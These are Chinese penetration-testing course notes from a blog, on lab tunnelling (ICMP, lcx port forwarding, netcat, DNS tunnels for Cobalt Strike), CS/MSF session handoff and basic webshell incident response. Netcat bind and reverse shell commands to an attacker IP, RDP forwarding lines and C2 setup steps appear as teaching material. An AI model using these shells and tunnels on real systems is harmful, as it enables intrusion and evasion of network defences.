# XD安全渗透测试课 学习笔记 | 内网渗透(四)

原创 耳鼠 [0x00实验室](javascript:void(0);) *2021-08-13 07:03*

收录于合集#小迪安全笔记20个

  本文章来源于团队成员耳鼠的个人学习笔记，是内网渗透阶段的最后一篇，本系列笔记定期更新，麻烦点个关注吧！



------

往期回顾

day58-64 [XD安全渗透测试 笔记 |  提权阶段](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247483877&idx=2&sn=35f4bdce1d4043219dbbb67420bb5818&chksm=cfd87e1af8aff70c74e6a5541d7b120548ac3242a320083a81f4b0ae3971d60b2903e7245705&scene=21#wechat_redirect)



day65-66 [XD安全渗透测试 笔记 |  内网渗透(一)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484046&idx=1&sn=85b730dafd28d0e798b8c70fe8130582&chksm=cfd87d71f8aff4672c1c0d254342b6e63f026b825be225e8af7fa30f364cf49bbdb384b42b0f&scene=21#wechat_redirect)



day67-68 [XD安全渗透测试 笔记 |  内网渗透(二)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484112&idx=1&sn=036ffcfd03b4a4ee94f6f787cd7986a7&chksm=cfd87d2ff8aff439d9c2a89c2054b471a05c800e7a3d7ee605ef642b3321cab54b1423243454&scene=21#wechat_redirect)



day69-70 [XD安全渗透测试 笔记 | 内网渗透(三)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484247&idx=1&sn=abc131479e3df8a5389f97452d5e0241&chksm=cfd87ca8f8aff5be206c7f90aaef732828abafc98d840f90f9b31ba8e123cf3cc8091ea27cd2&scene=21#wechat_redirect)



------



**Day71.域横向网络 & 传输 & 应用层隧道技术**

必备知识点:

1.代理和隧道技术区别?

  代理主要是解决访问问题

2.隧道技术为了解决什么?

3.隧道技术前期的必备条件?

  已经获得一定的控制权,但是不能对控制的东⻄进行信息收集或执行它上面的东⻄在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截CS、MSF无法上线,数据传输不稳定无回显,出口数据被监控,网络通信存在问题等.

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hsPxjONoz2iajEjbWe8CLrFa3FEdUNibPWHjSyCEZuutytbF0ah4uUWQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**
**

常用的隧道技术有以下三种:

- 网络层:IPV6隧道、ICMP隧道
- 传输层:TCP、UDP、端口转发
- 应用层:SSH、HTTP/S隧道、DNS隧道



实验环境：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3YopJrxCo1QDQxYH4eTIXzcmx1owx44Y6Vic7xuw2n70BfQv3btNaZ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



网络传输应用层检测连接通信-检测

1.TCP协议

  用瑞士军刀-netcat

  执行nc命令:nc<IP> <端口>

2.HTTP协议

  用“curl”工具,执行curl<IP地址:端口>命令。如果远程主机开启了相应的端口,且内网可连接外网的话,就会输出相应的端口信息

3.ICMP协议

  用"ping"命令,执行ping <IP地址/域名>

4.DNS协议

  检测DNS连通性常用的命令是"nslookup"和"dig"

  nslookup是Windows自带的DNS探测命令

  dig是Linux系统自带的DNS探测命令



案例2-网络层ICMP隧道ptunnel(老工具,可以使用新的)使用-检测,利用

kali-Target2-Target3



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3LSoezrNqdgfr7LibloLQaWKLFRex4iaA5HH2Rv7JnQ8c4knbCWa4q7uQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd34ZQ1Ribd1m3sqbAOlkicmHSIOb1KZCDUUkONlQESUg7pBAq458m1waicQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



前期要将工具上传至Target2，在webserver上允许程序运行

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3oq3Xb6dc8KjGOCYYk9dREMtzE55MlahoRUqicKibbPwCssUFuC6rOqrA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



再kali主机上执行运行命令。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3IcseS3z3F3xBgr7C1IXficrCoiaT3fh1aFlIYKSibKAd0iaibzEdNKEErwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



发现有流量过来：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ibrHtVrWqxkDP7j7YIr8kt66ZnHYNyU4icDg5BdhxlYubPeF0MScGdzQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



连接本地1080端口：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3s0ib8IlUPhCIcEckadSFHzibNvgRl9TNyEBvB5NQLpicGuXhLKEtlETPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



弹出远程连接端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3KODa6qzUJ3G0kPiawcvT85SjKRlStXLE7ia4opr2QUee834uVs8Xgk5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在Target3上我们发现3389端口正在被Target2请求,实际上是kali请求的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3IUOaVGyALt9yz5t7x9B88s6mLGZw3gAJKrqLGngdmnaKF6RzEMe0Xw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

现在远程连接它走的不是以前的那个协议,而是ICMP流量的数据

把3389流量转成了ICMP流量





**案例3-传输层转发隧道Portmap使用-检测,利用**

端口转发,环境是域环境

Windows:lcx

Linux:portmp

lcx -slave 攻击IP3131 127.0.0.1 3389 //将本地3389给攻击IP的3131

lcx -listen 3131 3333//监听3131转发至3333



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3z9vJpS1dzXMa0uNxHvS3xmwvO8WjRXYmWfIM6Wq6I5hCia22KDOcUibA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PNZzuX5WTCkjmDJ0wlQsHDzPE3qvicib1G1Ba2EAq7x5ycJGAO5e82tA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



用kali连接WEbserver的7777

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hGbvNGPuCRjcDzwqY4RN8xzDYWzjzAeiappqzAWLRvNn5Ydcow47D6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3XK8HTjBCbway3m5PUphUNGa4zKY2Vgn4DUz3ibMyyXUWC9zxlDZTpYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**案例4-传输层转发隧道Netcat使用-检测,利用,功能**



kali-god\webserver-god\sqlserver | dc

1.双向连接反弹shell

  正向:攻击连接受害

  受害:nc -ldp 1234 -e /bin/sh //linux

  nc -ldp 1234 -e c:\windows\system32\cmd.exe //windows

  攻击:nc 192.168.76.132 1234 //主动连接



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3v0goIIrMoa1cRV9VXxMymjqqwmicGYgQ0sFHMnibq8mib6Gr74MfwWang/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3dMWzu50C4qkblukEBTVx8u8SdnG988WibloyhyYoj7DW2hsWccxeahQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3auO9QJt0patkEsib9NwWo9cU63er9pFR9BkGOh38snVjWuOSicDZVLMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 
- 
- 
- 
- 

```
反弹回会话反向:受害连接攻击攻击:nc -lvp 1234受害:nc 攻击主机IP 1234 -e /bin/shnc 攻击主机IP 1234 -e c:\windows\system32\cmd.exe
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3R3DONibxDD4BAmoI9tn7QKxtDoW1fFibXJz5nSHSmib32IFY2HISREaeg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3kabRAuBeCHzaHAOhrzgGltckZ7aDBzqldCbribGGUVNmMUMz39tVZBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



反弹回shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3L9lpBhptjIYdlb8UX4MUgzlcL1VZgoXt0N7l4u6dk2Kic8B2l4cYLjg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



2.多向连接反弹shell-配合转发

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3XeqzORxwAKpficIFHKgaErAgzmfIia5DxABC2s6w41SADFicQTlo6ia2yA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3CUIxppFAFe4XicKCGchgRDCGVyJvH9Iv6vVlKUfSr4ibFYFKVsonXtJw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd32rmL32tzxhxI9c6fEc7JZPhZyWezMcWj0klnNWuMbxrrKdUEFlynuA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



直接反弹回来了shell



3.相关netcat主要功能测试

  指纹服务:nc -nv 192.168.76.143

  端口服务:nc -v -z 192.168.76.143 1-100

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3HxVhFIcOgKZLbAmoWDC6PiayMVZlSJb42ns9MgDn50YfibDONiabIUibVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



端口监听:nc -lvp xxxx

文件传输:nc -lp 1111 >1.txt | nc -vn xx.xx.xx.xx 1111 <1.txt -q 1



**案例5-应用层DNS隧道配合CS上线-检测,利用,说明**

​    当常⻅协议监听器被拦截时,可以换其他协议上线,其中的dns协议上线基本通杀

1.云主机Teamserver配置端口53启用-udp

2.买一个域名修改解析记录如下:

  A记录-cs主机名-cs服务器ip

  NS记录-ns1主机名-上个A记录地址

  NS记录-ns2主机名-上个A记录地址



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3t2SpoyF7DmZexicDlFNxJXVeWYNib4Gicwyia1lbeoJfRdrosp466d4sqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



3.配置DNS监听器内容如下:

  ns1.xiaodi8.com

  ns2.xiaodi8.com

  cs.xiaodi8.com

  

在CS中添加监听器

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3Lcs4GF4w1icoYxYoSApdIulLxsyWEIh6t4odvOA8ME54XMQRyEKJXoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



4.生成后⻔执行上线后启用命令:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd36D46C8zrJu7HSFXmpT2ZiaYbhCdkCeVbmbnVRjCXVV1EWNzzPlI20XA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



xiaodi-pc\xiaodi

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3KZvbECSkydVV5yxJbic9uw0mYwpOxQPsYia5ShmxbkHUoK4lI2hly33Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



执行完命令之后



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hc3yq7uaRzO9KlYfribEOCkhUEjWflJLScg6NsXHCicXXtt7x9catkMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



生成后⻔:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3opnaR4BRXW6qjfk9Tqk7Lgy9DoEB5VnK6yVDOjHPpqOxNoH7HXibubg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



上传后⻔,执行,上线

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ML1AyOnrc65w9ELaiaIhqZic5vKGwdyEAgcO9Z2pPDHibTYRe03GOZtrw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



dns上线后视图中的电脑和其他协议不同,速度慢,还要执行几条命令才能行

  

学隧道的意义?

  测试的协议可能会被拦截。

  有个网站是有80端口 ,http服务的。有漏洞,但访问不了,一访问就断断续续或直接访问不到。原因可能是对方防火墙禁止你的IP访问或者检测到有异常,这个时候,如果去搞的话,都是http协议,我们可以换个协议去搞



------

**Day72.域横向 CS&MSF 联动及应急响应初识**

**
**

演示案例:

  MSF&CobaltStrike联动shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3Zlyibm5cbZmAUfcTWgz0WkHaPicU6aLdYArxpRlcUG3O1FNB0DlCA4Rw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



目标机:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd30GkbPict7XJLconE3ibg40zGEjbYficBAo0vJ7nXZdlXCkiakwkG5xslaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



启动CS服务端

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3JgOa763bQk72kk7FEpngXKUlyyib9I4AOaAPlcuzDW6kVaMklu7Kic4A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



启动CS客户端

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3GmcwJvlvGMeGZZZkicxBE4NsduNUFSicW7U2XLxXyDlTmk4HbicOg6dicQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



目标机执行木⻢,在CS上上线

启动MSF

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3OgdTPXczB4EHExhNhlp2nxs7UHX0RmiaCwLkfVdYANy5O7CPuUm3WBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



接下来,将CS移交到MSF上,首先,有创建一个监听器,host是msf所在服务器IP

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PiaoGdN1picv1iaEpFug1uia1vaibshsOHmicgXWDoiaUIF9QnoOHicwDJpdqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3xJibA59r39AztwKRlcrmdoRQDlIHkgibq22kWeXiaIAUSWibvvTWPiaKxEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在msf上创建监听器,payload要和cs监听器协议一样,端口也要一样

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3BXbdGH0AqwrIvZ1AMRnvibpY0UD9S39IYyIl0bUboxue362OZ1oNrwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



想要反弹哪个会话,点击视图中对应的电脑,选择Spawn

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3tpYX08LkufjxXEZlatHHyIzibG6NyAGMXDd0s8XdDnQtQb2Q7iclyjlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3cYCh21CqFOXprMm627L1q50Gc03ZyicLb29zoO2PV24wtfmhFSTE86Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在msf处上线

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3AbQqdBqlGYziadPRmibHf8CwLcicAv5q4FgibFiahteVr1ebwj1LWcd1Yjw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



从msf到cs,先记录要返回session的id

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3kdFLmSm9z5AK8YdX8xBcnXHtRyrBYZYlxRmhiariahgmQic9B1o54w3pw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3A556wjIo1kqqLP0d4aCD95ia6A7xxqwIDiazbaDmvs226t7y9quPEH1A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3t3dy7MSIiaL87x9RJqwIQgfCRrFYjEAeHVPk9FzcJUSvmoFjibIpIyew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3mjCeictibbRJs1qYTBtMeIX36XoLGV8psE14klfLTuB95LjvqtEZibX8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



目前三台主机在cs上

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3jNmgn8pYslNch6XxaJoYFLqqSJh7oDzfwWD5QfVIib6Q4BIu6rznD4Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在成了4台

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3C5XB6G8pqiaCuR5dORzudoUjKkuhl5gFwEOBOZt3TxNXRyvhwb9zn5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**案例2-web攻击应急响应溯源-后⻔,日志**

故事回顾:某顾客反应自己的网站首⻚出现被篡改,请求置源

分析:涉及的攻击面 涉及的操作权限 涉及的攻击意图(修改网站为了干嘛?,可以从修改的网站来分析) 涉及的攻击方式等

思路1:

  利用日志定位修改时间基数,将前时间进行攻击分析,后时间进行操作分析

思路2:

  利用后⻔webshell查杀脚本或工具找到对应后⻔文件,定位第一时间分析先查看开放的端口,再查看端口所对应的服务



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd35GiaEEbcKGIaMMQ4cDt1SKxRaZp1TL4KmaUVyBLqmfUia8xM5agIdElg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PRFcsO5g1VpYrvE3sj8XP332LbTHvK5golW3wIjqfWbLED4iaxRMM1g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

通过任务管理器找到该进程的路径

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3U2XIBBosicCmicTWMD2Fv4gODF9LSpRm8lhia6O6zZG4dm5ibGGOeLCsRA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



看到是由Apache搭建的,Apache有日志记录

首⻚被修改,首⻚可能是index等地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3sa0lfF0HiadVFf8ER95wxKVN4slUXokskwZwM70T7L0Uwc3eBtic2Ncg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



通过查看发现这个x.php很特殊,对应找到网站目录

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3qVW8jTSUkqqSSdBuHkxibrjSrgxtIEInUuiaYSJHuvaxYZPPyh57WGFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



打开发现是一个后⻔

可以根据工具的指纹来发现是什么工具

后⻔查杀工具

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3qn97wOL1UJcmUosIRG1WQLk0jibh4VP0FIkwe3WHRPURQe8cwRExTzg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3lNUFgDUx1iaicKaE7qpUn3bGN5y2hwgaE61Hq4OcXdLCJFMBCDNkrJHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



后⻔会占用资源

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3jWpPDpsII17nZjnDm6geXJdtibrrRkwU1ewXD9yiaRCYfxaVFbaicZx7g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



监管进程,标为蓝色的为系统外进程,属于第三方

  看到可以进程,但还是不能确定是木⻢。可以分析,这个进程启动后有什么操作,对外连接吗?

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3cB1rZa6yPgoDib4DmGO8dfA3qLjWBicDQhBNkicnHBohic5fGLEuHlTPzQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



查看网络,发现有网络连接,可以确定是木⻢

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3DhSzIEhAxRTlicOUoYwlOs6GVdXeOpzsDXokib3Yicq1s4sficicawYamgw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

检查文件执行记录,可以用来分析木⻢的执行时间

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ib9VRMJa85NAPMltbNJZV61hvpctnODvgRQXwo3rzfMxVrgnwdMEh4A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

再通过这个时间去查找日志前后



------

 

  未完待续....